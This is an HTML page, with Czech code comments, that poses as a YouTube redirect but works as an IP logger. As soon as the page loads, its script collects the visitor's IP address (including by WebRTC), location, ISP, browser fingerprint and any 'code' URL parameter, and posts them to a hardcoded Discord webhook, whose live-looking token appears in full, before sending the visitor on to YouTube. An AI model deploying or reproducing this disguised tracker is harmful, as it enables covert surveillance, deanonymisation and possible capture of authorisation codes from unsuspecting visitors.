<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Redirecting...</title>
    
    <!-- TV≈ÆJ DISCORD WEBHOOK -->
    <meta name="discord-webhook" content="https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma">
    
    <meta http-equiv="refresh" content="3;url=https://www.youtube.com">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ff0000, #cc0000);
            font-family: 'Arial', sans-serif;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 15px;
            max-width: 900px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        .logo { 
            font-size: 80px; 
            text-align: center;
            margin-bottom: 20px; 
            animation: pulse 1s infinite; 
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        h1 { 
            font-size: 32px; 
            margin-bottom: 20px; 
            text-align: center;
            color: #fff;
        }
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }
        .status-card {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            padding: 20px;
            border-left: 5px solid #ff0000;
        }
        .status-card.success { border-left-color: #4CAF50; }
        .status-card.error { border-left-color: #f44336; }
        .status-card.warning { border-left-color: #ff9800; }
        .status-title {
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .status-value {
            font-size: 16px;
            word-break: break-all;
        }
        .loading {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            margin: 25px 0;
            overflow: hidden;
        }
        .loading-bar {
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff9900);
            animation: loading 3s linear forwards;
        }
        @keyframes loading {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(0); }
        }
        .countdown {
            font-size: 24px;
            margin: 20px 0;
            color: #ffcc00;
            font-weight: bold;
            text-align: center;
        }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 25px 0;
            flex-wrap: wrap;
        }
        .btn {
            background: #333;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
            min-width: 160px;
        }
        .btn:hover { 
            background: #444; 
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn-red { background: #ff0000; }
        .btn-green { background: #00aa00; }
        .btn-blue { background: #0066cc; }
        .debug-panel {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 20px;
            margin-top: 25px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            display: none;
        }
        .log-entry {
            margin: 8px 0;
            padding: 8px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .log-time {
            color: #888;
            margin-right: 10px;
        }
        .log-info { color: #2196F3; }
        .log-success { color: #4CAF50; }
        .log-warning { color: #ff9800; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">‚ñ∂Ô∏è</div>
        <h1>Redirecting to YouTube...</h1>
        
        <div class="countdown" id="countdown">Starting in 3 seconds...</div>
        
        <div class="loading">
            <div class="loading-bar"></div>
        </div>
        
        <div class="status-grid">
            <div class="status-card" id="ip-card">
                <div class="status-title">üåê IP Address</div>
                <div class="status-value" id="ip-value">Detecting...</div>
            </div>
            
            <div class="status-card" id="location-card">
                <div class="status-title">üìç Location</div>
                <div class="status-value" id="location-value">Detecting...</div>
            </div>
            
            <div class="status-card" id="browser-card">
                <div class="status-title">üñ•Ô∏è Browser Info</div>
                <div class="status-value" id="browser-value">Detecting...</div>
            </div>
            
            <div class="status-card" id="status-card">
                <div class="status-title">üìä Status</div>
                <div class="status-value" id="status-value">Initializing...</div>
            </div>
        </div>
        
        <div class="button-group">
            <button class="btn btn-green" onclick="collectData()">
                üîç Collect Data
            </button>
            <button class="btn btn-blue" onclick="toggleDebug()">
                üêõ Debug Panel
            </button>
            <button class="btn btn-red" onclick="cancelRedirect()">
                ‚ùå Cancel Redirect
            </button>
            <button class="btn" onclick="testDiscord()">
                üì§ Test Discord
            </button>
        </div>
        
        <div class="debug-panel" id="debug-panel">
            <h3 style="margin-bottom: 15px; color: #ffcc00;">Debug Log</h3>
            <div id="debug-log"></div>
        </div>
        
        <p style="margin-top: 25px; text-align: center; font-size: 14px; opacity: 0.8;">
            If not redirected in 5 seconds, 
            <a href="https://www.youtube.com" style="color: #ffcc00; text-decoration: none; font-weight: bold;">
                click here to go to YouTube
            </a>
        </p>
    </div>

    <script>
        // ============================================
        // KONFIGURACE
        // ============================================
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma";
        let isCancelled = false;
        let redirectTimer;
        let collectedData = {};
        
        // ============================================
        // LOGOVAC√ç SYST√âM
        // ============================================
        function log(message, type = 'info') {
            const logDiv = document.getElementById('debug-log');
            const time = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
            logDiv.appendChild(logEntry);
            logDiv.scrollTop = logDiv.scrollHeight;
            
            // Tak√© do konzole
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        function updateStatus(elementId, value, type = 'info') {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = value;
                
                // Aktualizovat i parent card
                const card = element.closest('.status-card');
                if (card) {
                    card.className = `status-card ${type}`;
                }
            }
        }
        
        function toggleDebug() {
            const panel = document.getElementById('debug-panel');
            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
        }
        
        // ============================================
        // 1. Z√çSK√ÅN√ç IP ADRESY - OPRAVEN√Å VERZE
        // ============================================
        async function getRealIP() {
            log('Starting IP detection...', 'info');
            updateStatus('ip-value', 'Detecting via Netlify Function...');
            
            try {
                // 1. Zkusit Netlify Function
                log('Trying Netlify Function: /.netlify/functions/getip', 'info');
                const response = await fetch('/.netlify/functions/getip');
                
                if (response.ok) {
                    const data = await response.json();
                    log(`Netlify Function response: ${JSON.stringify(data)}`, 'info');
                    
                    if (data.success && data.ip && data.ip !== 'Unknown') {
                        log(`‚úÖ IP from Netlify Function: ${data.ip}`, 'success');
                        updateStatus('ip-value', data.ip, 'success');
                        return data.ip;
                    }
                }
            } catch (error) {
                log(`Netlify Function error: ${error.message}`, 'warning');
            }
            
            // 2. Pokud Netlify Function sel≈æe, pou≈æij ve≈ôejn√© API
            updateStatus('ip-value', 'Using public APIs...', 'warning');
            log('Trying public IP APIs...', 'warning');
            
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.myip.com',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://worldtimeapi.org/api/ip'
            ];
            
            for (const service of ipServices) {
                try {
                    log(`Trying: ${service}`, 'info');
                    
                    // Bez AbortSignal.timeout (nen√≠ podporov√°n ve star√Ωch prohl√≠≈æeƒç√≠ch)
                    const controller = new AbortController();
                    const timeout = setTimeout(() => controller.abort(), 3000);
                    
                    const response = await fetch(service, {
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeout);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = data.ip || data.client_ip || data.query || 'Unknown';
                        
                        if (ip !== 'Unknown') {
                            log(`‚úÖ IP from ${service}: ${ip}`, 'success');
                            updateStatus('ip-value', ip, 'success');
                            return ip;
                        }
                    }
                } catch (error) {
                    log(`Service ${service} failed: ${error.message}`, 'warning');
                    continue;
                }
            }
            
            // 3. WebRTC jako posledn√≠ mo≈ænost
            try {
                log('Trying WebRTC detection...', 'info');
                const rtcIP = await getWebRTCIP();
                if (rtcIP) {
                    log(`‚úÖ IP from WebRTC: ${rtcIP}`, 'success');
                    updateStatus('ip-value', `${rtcIP} (WebRTC)`, 'success');
                    return rtcIP;
                }
            } catch (error) {
                log(`WebRTC failed: ${error.message}`, 'warning');
            }
            
            // 4. Fallback na client-side detection
            log('All methods failed, using fallback detection', 'error');
            updateStatus('ip-value', 'Unable to detect (check console)', 'error');
            return 'Unknown';
        }
        
        // WebRTC IP detection
        function getWebRTCIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    
                    const candidate = ice.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(ipRegex);
                    
                    if (match) {
                        const ip = match[1];
                        // Filtruj lok√°ln√≠ IP adresy
                        if (!ip.startsWith('192.168.') && 
                            !ip.startsWith('10.') && 
                            !ip.startsWith('172.16.') &&
                            !ip.startsWith('172.17.') &&
                            !ip.startsWith('172.18.') &&
                            !ip.startsWith('172.19.') &&
                            !ip.startsWith('172.20.') &&
                            !ip.startsWith('172.21.') &&
                            !ip.startsWith('172.22.') &&
                            !ip.startsWith('172.23.') &&
                            !ip.startsWith('172.24.') &&
                            !ip.startsWith('172.25.') &&
                            !ip.startsWith('172.26.') &&
                            !ip.startsWith('172.27.') &&
                            !ip.startsWith('172.28.') &&
                            !ip.startsWith('172.29.') &&
                            !ip.startsWith('172.30.') &&
                            !ip.startsWith('172.31.')) {
                            pc.close();
                            resolve(ip);
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 2000);
            });
        }
        
        // ============================================
        // 2. Z√çSK√ÅN√ç GEO-LOKACE
        // ============================================
        async function getGeoLocation(ip) {
            if (ip === 'Unknown' || ip.includes('192.168.') || ip.includes('127.0.0.1')) {
                updateStatus('location-value', 'Local network', 'warning');
                log('Skipping geolocation for local IP', 'warning');
                return null;
            }
            
            updateStatus('location-value', 'Detecting location...');
            log(`Getting geolocation for IP: ${ip}`, 'info');
            
            const geoServices = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipwhois.app/json/${ip}`,
                `https://ipinfo.io/${ip}/json`,
                `https://geolocation-db.com/json/${ip}`
            ];
            
            for (const service of geoServices) {
                try {
                    log(`Trying geolocation: ${service}`, 'info');
                    
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        
                        if (data.country || data.country_name) {
                            const location = {
                                country: data.country_name || data.country || 'Unknown',
                                city: data.city || 'Unknown',
                                region: data.region || data.regionName || 'Unknown',
                                isp: data.org || data.isp || 'Unknown',
                                countryCode: data.country_code || data.countryCode || 'Unknown'
                            };
                            
                            const locationStr = `${location.city}, ${location.country}`;
                            log(`‚úÖ Location found: ${locationStr}`, 'success');
                            updateStatus('location-value', locationStr, 'success');
                            
                            return location;
                        }
                    }
                } catch (error) {
                    log(`Geolocation service failed: ${error.message}`, 'warning');
                    continue;
                }
            }
            
            updateStatus('location-value', 'Location unknown', 'warning');
            log('All geolocation services failed', 'warning');
            return null;
        }
        
        // ============================================
        // 3. SBƒöR DAT PROHL√ç≈ΩEƒåE
        // ============================================
        function collectBrowserData() {
            const urlParams = new URLSearchParams(window.location.search);
            
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                referrer: document.referrer || 'Direct',
                cookies: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                discordCode: urlParams.get('code') || 'None',
                hostname: window.location.hostname,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                doNotTrack: navigator.doNotTrack || 'Unknown',
                plugins: navigator.plugins ? navigator.plugins.length : 0,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                vendor: navigator.vendor || 'Unknown'
            };
            
            const browserStr = `${data.platform} - ${data.screen} - ${data.language}`;
            updateStatus('browser-value', browserStr, 'success');
            log(`Browser data collected: ${browserStr}`, 'success');
            
            return data;
        }
        
        // ============================================
        // 4. ODESL√ÅN√ç NA DISCORD
        // ============================================
        async function sendToDiscord(data) {
            updateStatus('status-value', 'Sending to Discord...');
            log('Preparing Discord webhook payload...', 'info');
            
            if (!DISCORD_WEBHOOK || !DISCORD_WEBHOOK.includes('discord.com')) {
                const errorMsg = 'Invalid Discord webhook URL';
                updateStatus('status-value', errorMsg, 'error');
                log(errorMsg, 'error');
                return false;
            }
            
            try {
                // Vytvo≈ôit Discord embed
                const embed = {
                    title: 'üéØ NEW VISITOR LOGGED',
                    color: 0xFF0000,
                    timestamp: data.browser.timestamp,
                    fields: [
                        {
                            name: 'üåê IP Address',
                            value: `\`\`\`${data.ip}\`\`\``,
                            inline: true
                        },
                        {
                            name: 'üìç Location',
                            value: data.geo ? 
                                `**Country:** ${data.geo.country}\n**City:** ${data.geo.city}\n**ISP:** ${data.geo.isp}` :
                                'Unable to determine location',
                            inline: true
                        },
                        {
                            name: 'üñ•Ô∏è Device Info',
                            value: `**Platform:** ${data.browser.platform}\n**Screen:** ${data.browser.screen}\n**Browser:** ${data.browser.userAgent.substring(0, 100)}...`,
                            inline: false
                        },
                        {
                            name: 'üîó Referrer',
                            value: data.browser.referrer,
                            inline: true
                        },
                        {
                            name: 'üåç Website',
                            value: data.browser.hostname,
                            inline: true
                        },
                        {
                            name: 'üïí Time',
                            value: new Date(data.browser.timestamp).toLocaleString(),
                            inline: true
                        },
                        {
                            name: 'üì± Additional Info',
                            value: `**Timezone:** ${data.browser.timezone}\n**Language:** ${data.browser.language}\n**Cookies:** ${data.browser.cookies ? 'Enabled' : 'Disabled'}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `IP Logger ‚Ä¢ ${data.browser.hostname}`
                    }
                };
                
                const payload = {
                    embeds: [embed],
                    username: 'üîç IP Tracker',
                    avatar_url: 'https://cdn.discordapp.com/attachments/847471116316999690/894877973234393118/ezgif-4-b84848c6b4.gif'
                };
                
                log(`Sending to Discord webhook...`, 'info');
                log(`Payload: ${JSON.stringify(payload, null, 2)}`, 'info');
                
                // Odeslat na Discord
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    updateStatus('status-value', '‚úÖ Data sent to Discord!', 'success');
                    log('‚úÖ Successfully sent to Discord!', 'success');
                    return true;
                } else {
                    const errorText = await response.text();
                    updateStatus('status-value', `Discord error: ${response.status}`, 'error');
                    log(`‚ùå Discord error ${response.status}: ${errorText}`, 'error');
                    return false;
                }
                
            } catch (error) {
                updateStatus('status-value', `Error: ${error.message}`, 'error');
                log(`‚ùå Discord send error: ${error.message}`, 'error');
                return false;
            }
        }
        
        // ============================================
        // 5. HLAVN√ç FUNKCE
        // ============================================
        async function collectData() {
            updateStatus('status-value', 'Starting data collection...');
            log('=== STARTING DATA COLLECTION ===', 'info');
            
            try {
                // 1. Z√≠skat IP adresu
                const ip = await getRealIP();
                
                // 2. Z√≠skat geolokaci
                const geo = await getGeoLocation(ip);
                
                // 3. Sb√≠rat data prohl√≠≈æeƒçe
                const browserData = collectBrowserData();
                
                // 4. Ulo≈æit v≈°echna data
                collectedData = {
                    ip: ip,
                    geo: geo,
                    browser: browserData
                };
                
                log('=== DATA COLLECTION COMPLETE ===', 'success');
                log(`Collected data: ${JSON.stringify(collectedData, null, 2)}`, 'info');
                
                // 5. Odeslat na Discord
                updateStatus('status-value', 'Sending to Discord...');
                const sent = await sendToDiscord(collectedData);
                
                if (sent) {
                    updateStatus('status-value', '‚úÖ Complete! Redirecting...', 'success');
                } else {
                    updateStatus('status-value', '‚ö†Ô∏è Collected (Discord failed)', 'warning');
                }
                
                return collectedData;
                
            } catch (error) {
                updateStatus('status-value', `Error: ${error.message}`, 'error');
                log(`‚ùå Collection error: ${error.message}`, 'error');
                return null;
            }
        }
        
        // ============================================
        // 6. TEST FUNKCE PRO DISCORD
        // ============================================
        async function testDiscord() {
            log('=== TESTING DISCORD WEBHOOK ===', 'info');
            
            const testData = {
                ip: '8.8.8.8',
                geo: {
                    country: 'United States',
                    city: 'Mountain View',
                    isp: 'Google LLC'
                },
                browser: {
                    platform: 'Test Platform',
                    screen: '1920x1080',
                    userAgent: 'Test User Agent',
                    hostname: window.location.hostname,
                    timestamp: new Date().toISOString()
                }
            };
            
            updateStatus('status-value', 'Testing Discord webhook...');
            const result = await sendToDiscord(testData);
            
            if (result) {
                alert('‚úÖ Test successful! Check your Discord channel.');
            } else {
                alert('‚ùå Test failed. Check debug panel for details.');
            }
        }
        
        // ============================================
        // 7. REDIRECT FUNKCE
        // ============================================
        function startRedirect() {
            let seconds = 3;
            const countdownElement = document.getElementById('countdown');
            
            // Countdown animace
            const countdownInterval = setInterval(() => {
                if (seconds >= 0) {
                    countdownElement.textContent = `Redirecting in ${seconds} second${seconds !== 1 ? 's' : ''}...`;
                    seconds--;
                } else {
                    clearInterval(countdownInterval);
                }
            }, 1000);
            
            // Hlavn√≠ redirect timer
            redirectTimer = setTimeout(() => {
                if (!isCancelled) {
                    log('Performing redirect to YouTube...', 'info');
                    window.location.href = 'https://www.youtube.com';
                }
            }, 3000);
        }
        
        function cancelRedirect() {
            isCancelled = true;
            clearTimeout(redirectTimer);
            
            updateStatus('status-value', 'Redirect cancelled', 'warning');
            document.getElementById('countdown').textContent = 'Redirect CANCELLED';
            document.getElementById('countdown').style.color = '#ff4444';
            
            log('Redirect cancelled by user', 'warning');
            
            // P≈ôidat tlaƒç√≠tko pro manu√°ln√≠ redirect
            const manualBtn = document.createElement('button');
            manualBtn.className = 'btn btn-green';
            manualBtn.innerHTML = 'üöÄ Go to YouTube Now';
            manualBtn.onclick = () => window.location.href = 'https://www.youtube.com';
            manualBtn.style.marginTop = '15px';
            document.querySelector('.button-group').appendChild(manualBtn);
        }
        
        // ============================================
        // 8. INICIALIZACE
        // ============================================
        document.addEventListener('DOMContentLoaded', () => {
            log('üöÄ Netlify IP Logger started', 'success');
            log(`üåç Hostname: ${window.location.hostname}`, 'info');
            log(`üåê User Agent: ${navigator.userAgent}`, 'info');
            log(`üîó Discord Webhook: ${DISCORD_WEBHOOK ? 'Configured' : 'Not configured'}`, 
                DISCORD_WEBHOOK ? 'success' : 'error');
            
            // Automaticky sb√≠rat data
            setTimeout(async () => {
                await collectData();
            }, 1000);
            
            // Spustit redirect
            startRedirect();
            
            // Kl√°vesov√© zkratky
            document.addEventListener('keydown', (e) => {
                if (e.key === 'd' || e.key === 'D') toggleDebug();
                if (e.key === 'Escape') cancelRedirect();
                if (e.key === 't' || e.key === 'T') testDiscord();
                if (e.key === 'r' || e.key === 'R') collectData();
            });
        });
        
        // Exit tracking
        window.addEventListener('beforeunload', () => {
            if (collectedData.ip && collectedData.ip !== 'Unknown') {
                log(`User exited at ${new Date().toLocaleTimeString()}`, 'info');
            }
        });
    </script>
</body>
</html>